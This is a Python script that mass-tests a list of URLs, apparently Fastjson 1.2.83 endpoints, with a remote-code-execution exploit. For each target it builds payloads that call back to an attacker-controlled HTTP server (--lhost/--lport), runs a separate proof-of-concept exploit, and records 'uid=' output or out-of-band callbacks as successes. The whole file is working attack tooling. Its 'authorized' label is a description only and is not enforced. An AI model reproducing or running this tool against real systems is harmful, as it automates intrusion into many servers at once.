#!/usr/bin/env python3
import argparse
import json
import os
import re
import subprocess
import sys
import time
from pathlib import Path
from urllib.parse import urlparse, urlunparse


ROOT = Path(__file__).resolve().parents[1]


def parse_modes(value):
    modes = [x.strip() for x in re.split(r"[,\s]+", value) if x.strip()]
    bad = [x for x in modes if x not in ("jdk8-http", "fd")]
    if bad:
        raise ValueError(f"unsupported mode(s): {', '.join(bad)}")
    return modes


def clean_tag(value):
    if not value:
        return ""
    tag = re.sub(r"[^A-Za-z0-9_]", "_", value)
    tag = re.sub(r"_+", "_", tag).strip("_")
    return tag[:80] or "target"


def load_urls(path):
    targets = []
    with open(path, "r", encoding="utf-8") as f:
        for lineno, raw in enumerate(f, 1):
            line = raw.strip()
            if not line or line.startswith("#"):
                continue
            # Allow comments after whitespace: "http://a/b  # note"
            line = re.split(r"\s+#", line, maxsplit=1)[0].strip()
            targets.append((lineno, line))
    return targets


def split_target(url, default_endpoint):
    parsed = urlparse(url)
    if parsed.scheme not in ("http", "https") or not parsed.netloc:
        raise ValueError("URL must start with http:// or https://")

    if default_endpoint:
        endpoint = default_endpoint if default_endpoint.startswith("/") else "/" + default_endpoint
        base = urlunparse((parsed.scheme, parsed.netloc, "", "", "", ""))
        return base, endpoint

    path = parsed.path or "/"
    if parsed.query:
        path = path + "?" + parsed.query
    base = urlunparse((parsed.scheme, parsed.netloc, "", "", "", ""))
    return base, path


def run(cmd, timeout=None):
    return subprocess.run(
        cmd,
        cwd=str(ROOT),
        text=True,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        timeout=timeout,
    )


def main():
    p = argparse.ArgumentParser(description="Batch HTTP tester for authorized Fastjson 1.2.83 endpoints.")
    p.add_argument("--lhost", required=True, help="attacker HTTP server address reachable by targets")
    p.add_argument("--lport", required=True, type=int, help="attacker HTTP server port")
    p.add_argument("--urls", required=True, help="file containing one HTTP/HTTPS target URL per line")
    p.add_argument("--endpoint", default="", help="endpoint appended to every host; if omitted, each URL line is treated as the full endpoint URL")
    p.add_argument("--cmd", default=os.environ.get("CMD", "id-oob"), help="command embedded in payload, default: id-oob")
    p.add_argument("--modes", default=os.environ.get("MODES", "jdk8-http fd"), help="modes to try: jdk8-http fd")
    p.add_argument("--wait", type=int, default=int(os.environ.get("WAIT", "15")), help="seconds to wait for /out per mode")
    p.add_argument("--max-fd", type=int, default=int(os.environ.get("MAX_FD", "256")), help="max fd for fd mode")
    p.add_argument("--stop-on-success", action=argparse.BooleanOptionalAction, default=True,
                   help="stop testing a target after first successful mode")
    p.add_argument("--tag-prefix", default=os.environ.get("TAG", ""), help="optional tag prefix")
    p.add_argument("--out", default="", help="write JSONL results to this path")
    p.add_argument("--log-dir", default="", help="directory for per-target logs, default: /tmp/fastjson-batch-<ts>")
    args = p.parse_args()

    try:
        modes = parse_modes(args.modes)
    except ValueError as e:
        print(f"[-] {e}")
        return 1

    targets = load_urls(args.urls)
    if not targets:
        print("[-] URL file is empty")
        return 1

    ts = time.strftime("%Y%m%d-%H%M%S")
    tag_prefix = clean_tag(args.tag_prefix) or f"b{int(time.time())}"
    log_dir = Path(args.log_dir) if args.log_dir else Path("/tmp") / f"fastjson-batch-{ts}"
    log_dir.mkdir(parents=True, exist_ok=True)
    out_path = Path(args.out) if args.out else log_dir / "results.jsonl"

    print(f"[*] Targets:  {len(targets)}")
    print(f"[*] Modes:    {' '.join(modes)}")
    print(f"[*] Callback: http://{args.lhost}:{args.lport}/")
    print(f"[*] Logs:     {log_dir}")
    print(f"[*] Results:  {out_path}")

    ok_count = 0
    fail_count = 0
    with open(out_path, "w", encoding="utf-8") as out:
        for index, (lineno, raw_url) in enumerate(targets, 1):
            try:
                base, endpoint = split_target(raw_url, args.endpoint)
            except ValueError as e:
                result = {"url": raw_url, "line": lineno, "status": "invalid", "error": str(e)}
                out.write(json.dumps(result, ensure_ascii=False) + "\n")
                out.flush()
                fail_count += 1
                print(f"\n[{index}/{len(targets)}] INVALID {raw_url}: {e}")
                continue

            target_ok = False
            print(f"\n[{index}/{len(targets)}] {base}{endpoint}")
            for mode in modes:
                tag = clean_tag(f"{tag_prefix}_{index}_{mode.replace('-', '_')}")
                build_cmd = ["bash", "scripts/build.sh", args.lhost, str(args.lport), args.cmd, mode, tag]
                exploit_cmd = [
                    "python3", "-u", "poc/exploit.py",
                    args.lhost, str(args.lport), base, endpoint,
                    "--mode", mode,
                    "--max-fd", str(args.max_fd),
                    "--tag", tag,
                    "--once",
                    "--wait", str(args.wait),
                ]

                log_file = log_dir / f"{index:04d}-{mode}.log"
                print(f"  - {mode}: building payload tag={tag}")
                build = run(build_cmd)
                with open(log_file, "w", encoding="utf-8") as lf:
                    lf.write("$ " + " ".join(build_cmd) + "\n")
                    lf.write(build.stdout)
                    lf.write("\n$ " + " ".join(exploit_cmd) + "\n")

                if build.returncode != 0:
                    status = "build_error"
                    output = build.stdout
                    rc = build.returncode
                else:
                    exploit = run(exploit_cmd, timeout=args.wait + 25)
                    with open(log_file, "a", encoding="utf-8") as lf:
                        lf.write(exploit.stdout)
                    rc = exploit.returncode
                    output = exploit.stdout
                    status = "ok" if rc == 0 else "fail"

                uid_line = ""
                for line in output.splitlines():
                    if line.startswith("uid="):
                        uid_line = line
                        break

                result = {
                    "url": raw_url,
                    "target": base + endpoint,
                    "line": lineno,
                    "mode": mode,
                    "tag": tag,
                    "status": status,
                    "returncode": rc,
                    "uid": uid_line,
                    "log": str(log_file),
                }
                out.write(json.dumps(result, ensure_ascii=False) + "\n")
                out.flush()

                if status == "ok":
                    ok_count += 1
                    target_ok = True
                    print(f"    [+] OK {uid_line or '(OOB received)'}")
                    if args.stop_on_success:
                        break
                else:
                    print(f"    [-] {status}; log={log_file}")

            if not target_ok:
                fail_count += 1

    print()
    print(f"[*] Done. success_targets={ok_count} failed_or_invalid_targets={fail_count}")
    return 0 if ok_count > 0 else 2


if __name__ == "__main__":
    sys.exit(main())
